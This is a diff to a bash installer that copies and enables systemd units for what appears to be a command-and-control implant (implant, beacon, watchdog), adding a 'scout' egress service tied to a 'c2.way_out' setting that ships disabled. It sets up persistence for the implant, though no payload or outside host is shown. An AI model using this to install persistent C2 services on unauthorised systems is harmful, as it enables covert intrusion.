@@ -30,12 +30,19 @@ echo -e "${GREEN}[+] Installing systemd units${NC}"
 cp "${SCRIPT_DIR}/raccoon-implant.service" /etc/systemd/system/
 cp "${SCRIPT_DIR}/raccoon-beacon.service" /etc/systemd/system/
 cp "${SCRIPT_DIR}/raccoon-watchdog.service" /etc/systemd/system/
+# The way-out scout. Installed and enabled like the three above, and it
+# exits 0 with nothing to do unless c2.way_out is switched on -- which is
+# how the shipped config leaves it. Installing it only when the block is
+# enabled would mean an operator who switches the block on later has a
+# policy with no scout behind it and no line saying so.
+cp "${SCRIPT_DIR}/raccoon-scout.service" /etc/systemd/system/
 
 systemctl daemon-reload
 
 systemctl enable raccoon-implant.service
 systemctl enable raccoon-beacon.service
 systemctl enable raccoon-watchdog.service
+systemctl enable raccoon-scout.service
 
 echo -e "${GREEN}[+] Core services enabled${NC}"
 
@@ -60,6 +67,7 @@ fi
 echo -e "${YELLOW}Management:${NC}"
 echo "  sudo systemctl start raccoon-implant    # full implant"
 echo "  sudo systemctl start raccoon-beacon     # beacon only"
+echo "  sudo systemctl status raccoon-scout     # the way out (off by default)"
 echo "  sudo systemctl status raccoon-implant"
 echo "  sudo systemctl status raccoon-beacon"
 echo "  sudo journalctl -u raccoon-implant -f"
